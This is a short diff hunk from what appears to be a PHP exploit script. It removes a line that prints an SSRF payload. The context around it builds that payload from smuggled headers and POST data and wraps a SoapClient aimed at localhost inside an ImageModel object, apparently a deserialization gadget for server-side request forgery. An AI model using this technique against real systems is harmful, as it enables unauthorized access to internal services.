@@ -41,8 +41,6 @@
        $smug_headers_str .
        $post_data;
 
-  echo $ssrf_payload . "\n";
-
   $ssrf_object = new ImageModel(new SoapClient(null, array(
           'uri' => 'bbb',
           'location' => $localhost,
